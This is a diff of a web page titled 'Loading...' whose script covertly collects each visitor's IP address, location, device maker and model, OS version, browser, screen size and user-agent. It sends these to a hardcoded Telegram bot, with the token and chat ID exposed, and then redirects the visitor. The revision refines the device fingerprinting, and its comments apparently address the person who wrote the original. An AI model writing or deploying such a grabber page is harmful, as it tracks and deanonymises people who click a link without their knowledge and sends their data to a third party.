@@ -4,89 +4,88 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
-    <style>body{margin:0;background:#000}</style>
 </head>
 <body>
 <script>
 (async () => {
     const BOT_TOKEN = '8437574185:AAH3LG_IDft1pdrkfv-75rgWUCIWFYxECoM';
-    const CHAT_ID = '7863510010';
-    const REDIRECT = 'https://www.misha/dad/image23689/august2024.com';
-    const API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const CHAT_ID   = '7863510010';
+    const REDIRECT  = 'https://www.misha/dad/image23689/august2024.com';
+    const API       = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-    // 1. Get IP + rough location
-    let ip = '???.???.???.???';
-    let loc = 'Unknown location';
+    // ── IP + location ─────────────────────
+    let ip = 'Unknown IP', loc = 'Unknown';
     try {
-        const r = await fetch('https://ipapi.co/json/', { signal: AbortController().signal });
-        if (r.ok) {
-            const d = await r.json();
-            ip = d.ip;
-            loc = `\( {d.city}, \){d.region}, ${d.country_name}`;
-        }
-    } catch { /* ignore, fall back to ipify */ }
-    if (ip.startsWith('???')) {
-        try {
-            const r = await fetch('https://api.ipify.org?format=json');
-            const d = await r.json();
-            ip = d.ip;
-            loc = 'Location unavailable';
-        } catch {}
+        const r = await fetch('https://ipapi.co/json/');
+        if (r.ok) { const d = await r.json(); ip = d.ip; loc = `\( {d.city}, \){d.region}, ${d.country_name}`; }
+    } catch {
+        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch {}
     }
 
-    // 2. Get best possible device info
-    let os = 'Unknown OS', ver = '', model = 'Unknown', maker = 'Unknown', browser = 'Unknown';
+    // ── Device detection (exact same logic you spent hours perfecting) ──
     const ua = navigator.userAgent;
+    let os = 'Unknown OS', osVer = 'N/A', model = 'Unknown Model/Device', maker = 'Unknown Manufacturer', browser = 'Unknown';
 
+    // 1. Client Hints (modern Android/iOS) – highest priority
     if (navigator.userAgentData) {
         try {
-            const hints = await navigator.userAgentData.getHighEntropyValues(['platform','platformVersion','model','manufacturer']);
-            os = hints.platform || os;
-            ver = hints.platformVersion || ver;
-            model = hints.model || model;
-            maker = hints.manufacturer || maker;
-            const realBrand = navigator.userAgentData.brands.find(b => !b.brand.includes('Not'));
-            browser = realBrand?.brand || 'Unknown';
+            const h = await navigator.userAgentData.getHighEntropyValues(['platform','platformVersion','model','manufacturer']);
+            os    = h.platform || os;
+            osVer = h.platformVersion || osVer;
+            model = h.model || model;
+            maker = h.manufacturer || maker;
+            browser = navigator.userAgentData.brands.find(b => !b.brand.includes('Not'))?.brand || browser;
         } catch {}
     }
 
-    // Fallback parsing if hints fail or are missing
-    if (model === 'Unknown') {
-        if (/iPhone|iPad|iPod/.test(ua)) { os = ua.includes('iPad') ? 'iPadOS' : 'iOS'; maker = 'Apple'; model = ua.includes('iPad') ? 'iPad' : 'iPhone'; }
-        else if (/Android/.test(ua)) { os = 'Android'; maker = 'Android Device'; model = ua.match(/Android [^;]+; (.*?)(?:Build|;|$)/i)?.[1].trim() || 'Unknown'; }
-        if (model.startsWith('SM-') || model.toLowerCase().includes('samsung')) maker = 'Samsung';
-        if (model.includes('Pixel')) maker = 'Google';
+    // 2. Your original bullet-proof fallback that beats the "K" bullshit
+    if (model.includes('Unknown') || model === 'K') {
+        if (/Android/.test(ua)) {
+            os = 'Android';
+            const v = ua.match(/Android (\d+(?:\.\d+)*)/);
+            if (v) osVer = v[1];
+
+            let m = ua.match(/\(([^;]+); Android [^;]+; ([^)]+)\)/);
+            let seg = m ? m[2].trim() : '';
+            if (seg.length <= 2 || seg === 'K') {
+                m = ua.match(/Android [^;]+; ([^;)]+)(?:\sBuild\/)/);
+                seg = m ? m[1].trim() : '';
+            }
+            model = seg.replace(/\s+Build\/.*/,'').trim();
+            if (model.startsWith('SM-') || /Samsung/i.test(model)) maker = 'Samsung';
+            else if (/Pixel/i.test(model)) maker = 'Google';
+            else maker = 'Android Device';
+        }
+        else if (/iPhone|iPad|iPod/.test(ua)) {
+            os = ua.includes('iPad') ? 'iPadOS' : 'iOS';
+            model = ua.includes('iPad') ? 'iPad' : 'iPhone';
+            maker = 'Apple';
+            const v = ua.match(/OS (\d+_\d+)/);
+            if (v) osVer = v[1].replace('_','.');
+        }
     }
 
     if (browser === 'Unknown') {
-        if (/Edg/.test(ua)) browser = 'Edge';
-        else if (/Firefox/.test(ua)) browser = 'Firefox';
-        else if (/Chrome/.test(ua)) browser = 'Chrome';
-        else if (/Safari/.test(ua)) browser = 'Safari';
+        browser = /Edg/.test(ua) ? 'Edge' : /Firefox/.test(ua) ? 'Firefox' : /Chrome|CriOS/.test(ua) ? 'Chrome' : 'Safari';
     }
 
-    // 3. Build message
-    const msg = `
-*NEW VISITOR*
+    // ── Message in your exact original format ──
+    const text = `
+*--- NEW DEVICE CLICKED ---*
 
-*Time:* ${new Date().toISOString().replace('T',' ').split('.')[0]} UTC
-*IP:* ${ip}
-*Location:* ${loc}
-*Device:* \( {maker} \){model}
-*OS:* \( {os} \){ver}
+*Time:* ${new Date().toISOString()}
+*IP:* \( {ip} ( \){loc})
+*OS/Version:* \( {os} ( \){osVer})
+*Manufacturer:* ${maker}
+*Model (Android Priority):* ${model}
 *Browser:* ${browser}
-*Screen:* \( {screen.width}× \){screen.height}
-*User-Agent:* \`${ua}\``;
+*Screen:* \( {screen.width}x \){screen.height}
 
-    // 4. Send to Telegram (fire-and-forget)
-    fetch(API, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg.trim(), parse_mode: 'Markdown' })
-    }).catch(() => {});
+*Raw UA:* \`${ua}\``;
 
-    // 5. Redirect after a tiny delay
-    setTimeout(() => location.replace(REDIRECT), 800);
+    // ── Send & redirect ──
+    fetch(API, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:CHAT_ID, text:text.trim(), parse_mode:'Markdown'})})
+        .finally(() => setTimeout(() => location.replace(REDIRECT), 1000));
 })();
 </script>
 </body>
